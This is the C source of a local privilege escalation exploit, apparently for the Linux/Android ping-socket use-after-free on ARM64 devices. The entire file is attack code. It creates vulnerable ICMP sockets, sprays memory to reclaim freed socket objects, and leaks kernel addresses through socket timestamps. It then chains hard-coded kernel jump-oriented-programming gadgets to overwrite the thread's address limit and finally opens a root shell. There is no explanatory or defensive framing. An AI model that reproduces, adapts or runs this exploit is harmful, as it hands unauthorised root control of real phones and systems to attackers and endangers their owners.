#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <linux/in.h>
#include <sys/sysinfo.h>

#define AUTOMATIC_FREE_SOCK 
#define LIST_POSION2 0x200200
#define MAX_CHILDREN_PROCESS 1024
#define MAX_SOCKETS 65000
#define MAX_MMAPS 1024
#define MMAP_SIZE 2 * 1024 * 1024
#define DEFAULT_RESERVE_MEM_SIZE 64 * 1024 * 1024
#define MAX_LOOPS 4
#define TIMESTAMP_MAGIC 0xcafebabe
#define OFFSET_SK_STAMP 0x1e0
#define OFFSET_SK_PROT 0x28
#define OFFSET_MC_LIST 0x2A0
#define MMAP_BASE(x) (((unsigned long)(x)) & ~(MMAP_SIZE - 1))
#define ADDR_ADD(p,n) ((void *)((char *)(p) + (n)))
#define ARRAY_SIZE(x) (sizeof (x) / sizeof (*(x)))

#define THREAD_SIZE 16384
// #define THREAD_SIZE 8192

#ifndef NSEC_PER_SEC
#define NSEC_PER_SEC 1000000000ULL
#endif

#ifndef SIOCGSTAMPNS
#define SIOCGSTAMPNS 0x8907
#endif

#define OOM_DISABLE -17

static unsigned long *vul_mmap_addrs[MAX_CHILDREN_PROCESS];
static unsigned long *sp;
extern int root(unsigned long *sp);

#ifndef AUTOMATIC_FREE_SOCK
static int sig_alarm = 0;
static void notify_child(int sig)
{
	sig_alarm = 1;
}
#endif

struct child_status
{
	int num_child_socks;
	int result;
};

static size_t get_page_size()
{
  static size_t pagesize;

  if (pagesize == 0) {
    pagesize = sysconf(_SC_PAGESIZE);
  }

  return pagesize;
}

static void * against_crash() 
{
	size_t pagesize = get_page_size();
	void *addr = (void *)((LIST_POSION2 / pagesize) * pagesize);
	addr = mmap(addr, pagesize, 
		PROT_READ | PROT_WRITE,
		MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (addr == MAP_FAILED)
	{
		printf("%s: mmap failed.\n", __func__);
		exit(-1);
	}

	*(void **)addr = NULL;

	if (mlock(addr, pagesize))
	{
		printf("%s: mlock failed.\n", __func__);
		exit(-1);
	}

	return addr;
}

static int maximize_fd_limit()
{
	struct rlimit rlim;
	if (getrlimit(RLIMIT_NOFILE, &rlim))
	{
		printf("getrlimit failed.\n");
		exit(-1);
	}

	rlim.rlim_cur = rlim.rlim_max;
	setrlimit(RLIMIT_NOFILE, &rlim);

	if (getrlimit(RLIMIT_NOFILE, &rlim))
	{
		printf("getrlimit failed.\n");
		exit(-1);
	}

	return rlim.rlim_cur;
}

static int create_icmp_socket()
{
	struct sockaddr_in sa;
	memset(&sa, 0, sizeof sa);
	sa.sin_family = AF_INET;

	int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
	if (sock == -1) {
		return -1;
	}

	int ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);

	if (ret != 0) {
		int result;

		result = errno;
		close(sock);
		errno = result;
		printf("%s: %s.\n", __func__, strerror(errno));
		fflush(stdout);

		return -1;
	}

  	return sock;
}

static void child_task(int pipe_write, int max_fds)
{
	int socks[max_fds];
	int result, num_socks = 0;
	int i;

	// close all fds except pipe_write
	for (i = 0; i < max_fds; ++i)
	{
		if (i != pipe_write)
		{
			if (close(i))
			{
				printf("%s: close fds failed.\n", __func__);				
				fflush(stdout);
				break;
			}			
		}
	}

	// create enough icmp sockets at child process
	for (i = 0; i < max_fds; ++i)
	{
		socks[i] = create_icmp_socket();
		if (socks[i] == -1)
		{
			result = errno;
			break;
		}
		num_socks ++;
	}

	// send status to parent process
	struct child_status status;
	memset(&status, 0, sizeof(status));
	status.num_child_socks = num_socks;
	status.result = result;
	write(pipe_write, &status, sizeof status);

	// wait to close
	close(pipe_write);

	#ifdef AUTOMATIC_FREE_SOCK	
	while (1)
	{
		sleep(1);
	}
	#else
	singnal(SIGALRM, notify_child);
	while (!sig_alarm)
	{	
		sleep(10);
	}

	for (i = 0; i < num_socks; ++i)
	{
		if (close(socks[i]) == -1)
		{
			printf("%s: close icmp socket failed.\n", __func__);
			exit(-1);
		}
	}
	#endif
}

static int wait_for_sockets_created(int pipe_read, int *num_socks_created)
{
	struct child_status status;
	if (fcntl(pipe_read, F_SETFL, O_NONBLOCK) == -1)
	{
		printf("%s: fcntl failed.\n", __func__);
		fflush(stdout);
		return -1;
	}

	for (int i = 0; i < 50; ++i)
	{
		int ret = read(pipe_read, &status, sizeof(status));
		if (ret == -1 && errno == EAGAIN)
		{
			usleep(100 *1000);
			if (i < 49)			
			{		
				continue;
			}
			printf("%s: read() timeout.\n", __func__);
			return -1;
		}
		if (ret == -1)
		{
			printf("%s: read() error.\n", __func__);
			return -1;
		}
		if (ret != sizeof(status))
		{
			printf("%s: read() unexpexted EOF.\n", __func__);
			return -1;
		}
		break;
	}

	*num_socks_created = status.num_child_socks;
	return status.result;

}

static int create_child(pid_t *pid, int *pipe_read, int max_fds, int *num_socks_created)
{
	int pipe_fds[2];
	*pid = -1;
	if (pipe(pipe_fds))
	{
		printf("%s create pipe failed.\n", __func__);
		return -1;
	}

	*pid = fork();
	if (*pid == -1)
	{
		printf("%s fork failed.\n", __func__);
		return -1;
	}

	if (*pid == 0)
	{
		/* do at child process */		
		close(pipe_fds[0]);
		child_task(pipe_fds[1], max_fds);
		exit(0);
	}

	close(pipe_fds[1]);
	*pipe_read = pipe_fds[0];

	int ret = wait_for_sockets_created(*pipe_read, num_socks_created);
	if (ret == EMFILE) { // too many open files
		return 0;
	}

	if (ret != 0)
	{
		kill(*pid, SIGKILL);
	}

	return ret;
}

static void close_child_sockets(int pipe_read, pid_t pid)
{	
	int timeout = 50;
	int status;

	close(pipe_read);

	#ifdef AUTOMATIC_FREE_SOCK
	kill(pid, SIGTERM);
	#else	
	kill(pid, SIGALRM);
	#endif

	while (timeout > 0)
	{
		timeout--;

		if (waitpid(pid, &status, WNOHANG) > 0)
		{
			#ifndef AUTOMATIC_FREE_SOCK
			if (!WIFEXITED(status))
			{
				printf("%s: pid-%d exit unexpexted.\n", __func__, pid);
				fflush(stdout);
			}
			#endif			
			break;
		}

		usleep(100 * 1000);
	}	

	// printf("%s: close pid-%d timeout because: %s, force kill.\n", __func__, pid, strerror(errno));
	fflush(stdout);
	kill(pid, SIGKILL);

	// if (waitpid(pid, &status, 0) == -1)
	// {
	// 	printf("%s: close pid-%d failed because: %s.\n", __func__, pid, strerror(errno));
	// 	fflush(stdout);
	// }
}

static int setup_vul_socket(int sock)
{
	struct sockaddr_in sa;
	memset(&sa, 0, sizeof sa);
	sa.sin_family = AF_UNSPEC;

	if (connect(sock, (struct sockaddr *)&sa, sizeof sa))
	{
		printf("%s: connect(%d) #1: errno = %d\n", __func__, sock, errno);
		fflush(stdout);
		return -1;
	}

	if (connect(sock, (struct sockaddr *)&sa, sizeof sa))
	{
		printf("%s: connect(%d) #2: errno = %d\n", __func__, sock, errno);
		fflush(stdout);
		return -1;
	}

	return 0;
}

static int create_vul_sockets(int **p_vul_socks)
{	
	int *vul_socks;
	int num_vul_socks = 0;
	int num_child_socks = 0;
	int num_child_process = 0;

	static pid_t pids[MAX_CHILDREN_PROCESS];
	static int pipe_reads[MAX_CHILDREN_PROCESS];

	printf("%s: start creating vulnerable sockets.", __func__);
	fflush(stdout);

	int max_fds = maximize_fd_limit();
	vul_socks = malloc((max_fds + 1) * sizeof (*vul_socks));
	if (!vul_socks)
	{
		printf("%s: not enough memory.\n", __func__);
		fflush(stdout);
		exit(-1);
	}


	// create plenty of sockets to raise memory layout(SLAB),
	// arrange vulnerable sockets around them
	for (int i = 0; i < MAX_CHILDREN_PROCESS; ++i)
	{
		printf(".");
		fflush(stdout);

		int max_children_socks = max_fds;		
		if (max_children_socks + num_child_socks > MAX_SOCKETS)
		{
			max_children_socks = MAX_SOCKETS - num_child_socks;
		}

		int num_socks_created = 0;
		int ret = create_child(&pids[i], &pipe_reads[i], max_children_socks, &num_socks_created);

		if (pids[i] == -1)
		{
			printf("%s: create more child process failed, main continue.\n", __func__);
			fflush(stdout);
			break;
		}

		num_child_process ++;
		num_child_socks += num_socks_created;

		if (num_vul_socks < max_fds)
		{
			vul_socks[num_vul_socks] = create_icmp_socket();
			if (vul_socks[num_vul_socks] == -1)
			{
				printf("%s: main process cannot create more vul socks, just continue.\n", __func__);
				fflush(stdout);
				break;
			}

			num_vul_socks++;
		}
		
		if (ret != 0)
		{
			printf("%s: child create more sockets failed, main continue.\n", __func__);
			fflush(stdout);
			break;
		}
	}

	printf("%s: create sockets finished. main:%d, child:%d.\n", __func__, num_vul_socks, num_child_socks);	
	fflush(stdout);

	// sockets clean
	for (int i = 0; i < num_child_process; ++i)
	{
		close_child_sockets(pipe_reads[i], pids[i]);		
	}

	if (num_vul_socks < 1)
	{
		printf("%s: no vulnerable sockets available.\n", __func__);
		free(vul_socks);
		exit(-1);
	}

	for (int i = 0; i < num_vul_socks; ++i)
	{		
		setup_vul_socket(vul_socks[i]);	
	}	

	*p_vul_socks = vul_socks;
	return num_vul_socks;
}

static void fill_with_payload(void *mmap_addr, size_t size)
{
	unsigned *p = mmap_addr;
	for (int i = 0; i < size; i += sizeof(*p) * 2)
	{
		*p++ = (unsigned)((unsigned long)p & 0xffffffff);
		*p++ = TIMESTAMP_MAGIC;
	}
}

static int get_sk_from_timestamp(int sock, unsigned long *p_sk)
{
	struct timespec tv;

	if (ioctl(sock, SIOCGSTAMPNS, &tv)) { return -1; }

	uint64_t value = ((uint64_t)tv.tv_sec * NSEC_PER_SEC) + tv.tv_nsec;
	uint32_t high = (unsigned)(value >> 32);
	uint32_t low = (unsigned)value;

	if (high == TIMESTAMP_MAGIC) {
		if (p_sk) { *p_sk = low - OFFSET_SK_STAMP; } 
		return 1;
	}

	return 0;
}

static void keep_against_crash()
{
	printf("%s: fatal error occurred, please reboot now to avoid crash.\n", __func__);
	fflush(stdout);
	while (1) { sleep(60); }
}

static int spray_find_exp_sockets(int *vul_socks, int num_vul_socks)
{
	void *mmap_addrs[MAX_MMAPS];
	int reserve_size = DEFAULT_RESERVE_MEM_SIZE;	
	int total_num_exp_sockets = 0;
	int num_exp_sockets = 0;
	int count_mmap = 0;
	struct sysinfo info;

	printf("%s: spary to find exploitable sockets.", __func__);
	for (int loop = 0; loop < MAX_LOOPS || info.freeram < reserve_size; ++loop)
	{	
		if (!sysinfo(&info) && info.freeram < reserve_size)
		{
			reserve_size = info.freeram;
			continue;
		}

		count_mmap = 0;
		for (int i = 0; i < MAX_MMAPS; ++i, count_mmap++)
		{
			printf(".");
			fflush(stdout);

			num_exp_sockets = 0;
			mmap_addrs[i] = mmap(NULL, MMAP_SIZE, 
				PROT_READ | PROT_WRITE | PROT_EXEC, 
				MAP_SHARED | MAP_ANONYMOUS, -1, 0);

			if (mmap_addrs[i] == MAP_FAILED)
			{
				printf("%s: mmap failed: %d-%s.\n", __func__, errno, strerror(errno));			
				break;
			}			
			
			// if (mlock(mmap_addrs[i], MMAP_SIZE))
			// {
			// 	printf("%s: mlock failed: %d-%s.\n", __func__, errno, strerror(errno));				
			// 	fflush(stdout);
			// }

			fill_with_payload(mmap_addrs[i], MMAP_SIZE);

			for (int j = 0; j < num_vul_socks; ++j)
			{
				if ((get_sk_from_timestamp(vul_socks[j], NULL) > 0) && !vul_mmap_addrs[j])
				{
					vul_mmap_addrs[j] = mmap_addrs[i];					
					num_exp_sockets++;
					printf("\n%s: socket index: %d in seg: %p is exploitable.", __func__, j, mmap_addrs[i]);
					fflush(stdout);
				}
			}

			if (num_exp_sockets)
			{
				mmap_addrs[i] = 0;
			}

			total_num_exp_sockets += num_exp_sockets;
			if (total_num_exp_sockets >= 2) { break; }
		}

		if (!count_mmap)
		{
			printf("%s: cannot allocate memory.\n", __func__);
			keep_against_crash();			
		}

		for (int i = 0; i < count_mmap && mmap_addrs[i]; ++i)
		{
			munmap(mmap_addrs[i], MMAP_SIZE);	
		}
		
		if (total_num_exp_sockets >= 2) { break; }
	}

	if (total_num_exp_sockets < 2) { keep_against_crash(); }

	return total_num_exp_sockets;
}

static int protect_from_oom_killer()
{
	char buf[16];

	int fd = open("/proc/self/oom_adj", O_WRONLY);
	if (fd == -1)
	{
		printf("%s: open() oom failed\n", __func__);
		return -1;
	}

	sprintf(buf, "%d\n", OOM_DISABLE);

	int ret = write(fd, buf, strlen(buf));
	if (ret == -1)
	{
		printf("%s: write() oom failed\n", __func__);
		return -1;
	}

	close(fd);
	return 0;
}

static void calculate_sk_addr(void **p_sk, int index)
{	
	// notice: perhaps due to Little Endian or alignment in memory, adjust offset 4
	*p_sk = (void *)(((unsigned long)vul_mmap_addrs[index]&0xffffffff00000000) + (unsigned long)*p_sk - 4);
}


static void prepare_leak_jop(unsigned long*p_entry, void *x19, unsigned long **mmap_addrs)
{
	/*
	0xFFFFFFC0000E2960: ldr x1, [x19, #0x10] ; ldr x0, [x19, #0x18] ; blr x1
	0xFFFFFFC0004A8D20: ldr x2, [x0, #0x58] ; ldr x1, [x0, #0x60] ; ldr x2, [x2] ; blr x2
	0xFFFFFFC0000E6CB4: ldr x3, [x1, #0x80] ; ldr x0, [x0, #8] ; blr x3
	0xFFFFFFC0002E9180: ldr x3, [x1, #0x68] ; cbz x3, loc_addr ; ldr x1, [x3, #0x18] ; cbz x1, loc_addr ; blr x1
	0xFFFFFFC0004A8D20: ldr x2, [x0, #0x58] ; ldr x1, [x0, #0x60] ; ldr x2, [x2] ; blr x2
	0xFFFFFFC000083DB8: mov x0, sp ; blr x1
	0xFFFFFFC0000E7F10: mov x1, x3 ; ldr x3, [x3, #0xc0] ; blr x3
	0xFFFFFFC0004AF68C: str x0, [x1, #8] ; mov x0, x19 ; ldr x1, [x19, #0x20] ; ldr x1, [x1, #0x28] ; blr x1
	*/
	unsigned long *p;
	*p_entry = 0xFFFFFFC0000E2960;

	// 0xFFFFFFC0000E2960: ldr x1, [x19, #0x10] ; ldr x0, [x19, #0x18] ; blr x1
	p = ADDR_ADD(x19, 0x10);
	*p = 0xFFFFFFC0004A8D20;
	p = ADDR_ADD(x19, 0x18);
	*p = (unsigned long)mmap_addrs[0];

	// 0xFFFFFFC0004A8D20: ldr x2, [x0, #0x58] ; ldr x1, [x0, #0x60] ; ldr x2, [x2] ; blr x2
	p = ADDR_ADD(mmap_addrs[0], 0x58);
	*p = (unsigned long)mmap_addrs[1];
	p = ADDR_ADD(mmap_addrs[0], 0x60);
	*p = (unsigned long)mmap_addrs[2];
	p = ADDR_ADD(mmap_addrs[1], 0x0);
	*p = 0xFFFFFFC0000E6CB4;

	// 0xFFFFFFC0000E6CB4: ldr x3, [x1, #0x80] ; ldr x0, [x0, #8] ; blr x3
	p = ADDR_ADD(mmap_addrs[2], 0x80);
	*p = 0xFFFFFFC0002E9180;
	p = ADDR_ADD(mmap_addrs[0], 0x8);
	*p = (unsigned long)mmap_addrs[3];

	// 0xFFFFFFC0002E9180: ldr x3, [x1, #0x68] ; cbz x3, loc_addr ; ldr x1, [x3, #0x18] ; cbz x1, loc_addr ; blr x1
	p = ADDR_ADD(mmap_addrs[2], 0x68);
	*p = (unsigned long)mmap_addrs[4];
	p = ADDR_ADD(mmap_addrs[4], 0x18);
	*p = 0xFFFFFFC0004A8D20;

	// 0xFFFFFFC0004A8D20: ldr x2, [x0, #0x58] ; ldr x1, [x0, #0x60] ; ldr x2, [x2] ; blr x2
	p = ADDR_ADD(mmap_addrs[3], 0x58);
	*p = (unsigned long)mmap_addrs[5];
	p = ADDR_ADD(mmap_addrs[3], 0x60);
	*p = 0xFFFFFFC0000E7F10;
	p = ADDR_ADD(mmap_addrs[5], 0x0);
	*p = 0xFFFFFFC000083DB8;

	// 0xFFFFFFC000083DB8: mov x0, sp ; blr x1
	// 0xFFFFFFC0000E7F10: mov x1, x3 ; ldr x3, [x3, #0xc0] ; blr x3
	p = ADDR_ADD(mmap_addrs[4], 0xc0);
	*p = 0xFFFFFFC0004AF68C;

	// 0xFFFFFFC0004AF68C: str x0, [x1, #8] ; mov x0, x19 ; ldr x1, [x19, #0x20] ; ldr x1, [x1, #0x28] ; blr x1
	// write sp into ADDR_ADD(mmap_addrs[4], 0x8);
	p = ADDR_ADD(x19, 0x20);
	*p = (unsigned long)mmap_addrs[6];
	p = ADDR_ADD(mmap_addrs[6], 0x28);
	*p = 0xFFFFFFC000412BD0;
}

static void prepare_write_jop(unsigned long*p_entry, void *x19, unsigned long **mmap_addrs)
{
	printf("leak sp is %p\n", *(mmap_addrs[4] + 1));
	fflush(stdout);	
	sp = *(mmap_addrs[4] + 1) & ~(THREAD_SIZE - 1);
	unsigned long addr_addr_limit = (unsigned long)sp + 8;
	/*
	0xFFFFFFC0000E2960: ldr x1, [x19, #0x10] ; ldr x0, [x19, #0x18] ; blr x1
	0xFFFFFFC0004A8D20: ldr x2, [x0, #0x58] ; ldr x1, [x0, #0x60] ; ldr x2, [x2] ; blr x2
	0xFFFFFFC0000E6CB4: ldr x3, [x1, #0x80] ; ldr x0, [x0, #8] ; blr x3
	0xFFFFFFC0002E9180: ldr x3, [x1, #0x68] ; cbz x3, loc_addr ; ldr x1, [x3, #0x18] ; cbz x1, loc_addr ; blr x1
	0xFFFFFFC0004A8D20: ldr x2, [x0, #0x58] ; ldr x1, [x0, #0x60] ; ldr x2, [x2] ; blr x2
	0xFFFFFFC00036E940: ldr x6, [x0, #0x28] ; ldr x5, [x6, #0x58] ; cbz x5, loc_addr ; blr x5
	0xFFFFFFC0002492D4: mov x5, x3 ; ldr x6, [x6, #0x1c8] ; ldr x6, [x6, #0x120] ; blr x6
	0xFFFFFFC000216840: ldr x19, [x5, #0xe8] ; ldr w3, [x3, #0x40] ; ldr x4, [x19, #0x18] ; ldr x4, [x4, #0x1b8] ; blr x4
	0xFFFFFFC000353CD4: ldr x1, [x1, #0x38] ; ldr x0, [x19, #8] ; ldr x3, [x0, #0x40] ; cbz x3, loc_addr ; ldr x0, [x19, #0x10] ; blr x3	
	0xFFFFFFC0004AF68C: str x0, [x1, #8] ; mov x0, x19 ; ldr x1, [x19, #0x20] ; ldr x1, [x1, #0x28] ; blr x1
	*/

	unsigned long *p;
	*p_entry = 0xFFFFFFC0000E2960;
	// 0xFFFFFFC0000E2960: ldr x1, [x19, #0x10] ; ldr x0, [x19, #0x18] ; blr x1
	p = ADDR_ADD(x19, 0x10);
	*p = 0xFFFFFFC0004A8D20;
	p = ADDR_ADD(x19, 0x18);
	*p = (unsigned long)mmap_addrs[7];

	// 0xFFFFFFC0004A8D20: ldr x2, [x0, #0x58] ; ldr x1, [x0, #0x60] ; ldr x2, [x2] ; blr x2
	p = ADDR_ADD(mmap_addrs[7], 0x58);
	*p = (unsigned long)mmap_addrs[8];
	p = ADDR_ADD(mmap_addrs[7], 0x60);
	*p = (unsigned long)mmap_addrs[9];
	p = ADDR_ADD(mmap_addrs[8], 0x0);
	*p = 0xFFFFFFC0000E6CB4;

	// 0xFFFFFFC0000E6CB4: ldr x3, [x1, #0x80] ; ldr x0, [x0, #8] ; blr x3
	p = ADDR_ADD(mmap_addrs[9], 0x80);
	*p = 0xFFFFFFC0002E9180;
	p = ADDR_ADD(mmap_addrs[7], 0x8);
	*p = (unsigned long)mmap_addrs[10];

	// 0xFFFFFFC0002E9180: ldr x3, [x1, #0x68] ; cbz x3, loc_addr ; ldr x1, [x3, #0x18] ; cbz x1, loc_addr ; blr x1
	p = ADDR_ADD(mmap_addrs[9], 0x68);
	*p = (unsigned long)mmap_addrs[11];
	p = ADDR_ADD(mmap_addrs[11], 0x18);
	*p = 0xFFFFFFC0004A8D20;

	// 0xFFFFFFC0004A8D20: ldr x2, [x0, #0x58] ; ldr x1, [x0, #0x60] ; ldr x2, [x2] ; blr x2
	p = ADDR_ADD(mmap_addrs[10], 0x58);
	*p = (unsigned long)mmap_addrs[12];
	p = ADDR_ADD(mmap_addrs[10], 0x60);
	*p = (unsigned long)mmap_addrs[13];
	p = ADDR_ADD(mmap_addrs[12], 0x0);
	*p = 0xFFFFFFC00036E940;

	// 0xFFFFFFC00036E940: ldr x6, [x0, #0x28] ; ldr x5, [x6, #0x58] ; cbz x5, loc_addr ; blr x5
	p = ADDR_ADD(mmap_addrs[10], 0x28);
	*p = (unsigned long)mmap_addrs[14];
	p = ADDR_ADD(mmap_addrs[14], 0x58);
	*p = 0xFFFFFFC0002492D4;

	// 0xFFFFFFC0002492D4: mov x5, x3 ; ldr x6, [x6, #0x1c8] ; ldr x6, [x6, #0x120] ; blr x6
	p = ADDR_ADD(mmap_addrs[14], 0x1c8);
	*p = (unsigned long)mmap_addrs[15];
	p = ADDR_ADD(mmap_addrs[15], 0x120);
	*p = 0xFFFFFFC000216840;

	// 0xFFFFFFC000216840: ldr x19, [x5, #0xe8] ; ldr w3, [x3, #0x40] ; ldr x4, [x19, #0x18] ; ldr x4, [x4, #0x1b8] ; blr x4
	p = ADDR_ADD(mmap_addrs[11], 0xe8);
	*p = (unsigned long)mmap_addrs[16];
	p = ADDR_ADD(mmap_addrs[11], 0x40);
	*p = (unsigned long)mmap_addrs[20];
	p = ADDR_ADD(mmap_addrs[16], 0x18);
	*p = (unsigned long)mmap_addrs[17];
	p = ADDR_ADD(mmap_addrs[17], 0x1b8);
	*p = 0xFFFFFFC000353CD4;

	// 0xFFFFFFC000353CD4: ldr x1, [x1, #0x38] ; ldr x0, [x19, #8] ; ldr x3, [x0, #0x40] ; cbz x3, loc_addr ; ldr x0, [x19, #0x10] ; blr x3	
	p = ADDR_ADD(mmap_addrs[13], 0x38);
	*p = addr_addr_limit - 8;
	p = ADDR_ADD(mmap_addrs[16], 0x8);
	*p = (unsigned long)mmap_addrs[18];
	p = ADDR_ADD(mmap_addrs[18], 0x40);
	*p = 0xFFFFFFC0004AF68C;
	p = ADDR_ADD(mmap_addrs[16], 0x10);
	*p = 0xFFFFFFFFFFFFFFFF;

	// 0xFFFFFFC0004AF68C: str x0, [x1, #8] ; mov x0, x19 ; ldr x1, [x19, #0x20] ; ldr x1, [x1, #0x28] ; blr x1
	p = ADDR_ADD(mmap_addrs[16], 0x20);
	*p = (unsigned long)mmap_addrs[19];
	p = ADDR_ADD(mmap_addrs[19], 0x28);
	*p = 0xFFFFFFC000412BD0;
}

static int prepare_get_root(void *sk, int sock, int *p_times)
{
	static unsigned long prot[32];
	static unsigned long *mmap_addrs[20];
	unsigned long *end_mmap_addrs;
	unsigned long *p;
	unsigned long jop_entry;

	if (*p_times == 0)
	{
		size_t pagesize = get_page_size();
		for (int i = 0; i < 21; ++i)
		{
			mmap_addrs[i] = mmap(NULL, pagesize * 4,
				PROT_READ | PROT_WRITE,
				MAP_SHARED | MAP_ANONYMOUS, -1, 0);
		}
		prepare_leak_jop(&jop_entry, sk, mmap_addrs);
	}
	else if (*p_times == 1)
	{
		prepare_write_jop(&jop_entry, sk, mmap_addrs);
	}

	for (int i = 0; i < ARRAY_SIZE(prot); ++i)
	{
		prot[i] = jop_entry;
	}

	end_mmap_addrs = (void *)MMAP_BASE(sk) + MMAP_SIZE - 1;

	// write 0 to &MC_LIST and prot to &SK_PROT
	p = ADDR_ADD(sk, OFFSET_MC_LIST);
	if (p <= end_mmap_addrs) { *p = 0; }

	p = ADDR_ADD(sk, OFFSET_SK_PROT);
	*p = (unsigned long)prot;

	*p_times += 1;
	return 1;
}

static void get_root(int *vul_socks, int num_vul_socks, int num_exp_sockets)
{	
	int is_root = 0;
	int has_invaild_sk = num_vul_socks - num_exp_sockets;
	int prepare_times = 0;

	for (int i = 0; i < num_vul_socks && prepare_times < 2; i++)
	{
		void *sk;
		if (!vul_mmap_addrs[i]) { continue; }
		if (get_sk_from_timestamp(vul_socks[i], (unsigned long *)&sk) <= 0) { continue; }
		calculate_sk_addr(&sk, i);
		printf("%s: sk is %p. vul_socks index is %d.\n", __func__, sk, i);
		prepare_get_root(sk, vul_socks[i], &prepare_times);

		// printf("\nwait for debug!\n");
		// fflush(stdout);
		// sleep(15);
		
		close(vul_socks[i]);
	}

	printf("finish %d preparations, modify cred to get root privilege\n", prepare_times);
	root(sp);
	if (getuid() == 0)
	{ 
		is_root = 1;
		printf("getuid: 0\n");
	}

	if (has_invaild_sk) { protect_from_oom_killer(); }
	if (is_root) 
	{
		// TODOï¼š bypass SEAndroid
		printf("root:/ #");
		fflush(stdout);
		ret = system("/system/bin/sh");
	}

	if (has_invaild_sk) { keep_against_crash(); }
}

int main(int argc, char const *argv[])
{
	void *list_posion2_addr;
	int *vul_socks;

	// 1. mmap memory at 0x200200 against kernel crashing
	list_posion2_addr = against_crash();

	// 2. create some vulnerable sockets
	int num_vul_socks = create_vul_sockets(&vul_socks);
	printf("create %d vulnerable sockets successfully.\n", num_vul_socks);
	printf("wait a moment to release sockets.\n");
	fflush(stdout);
	sleep(15);

	// 3. spray to overwrite above sockets, find more than double exploitable sockets
	int num_exp_sockets = spray_find_exp_sockets(vul_socks, num_vul_socks);
	printf("find %d exploitable sockets.\n", num_exp_sockets);
	fflush(stdout);

	// 4. trigger vulnerability and bypass some mitigations to root
	get_root(vul_socks, num_vul_socks, num_exp_sockets);

	if (!list_posion2_addr)
	{
		munmap(list_posion2_addr, get_page_size());	// munmap memory
	}

	return 0;
}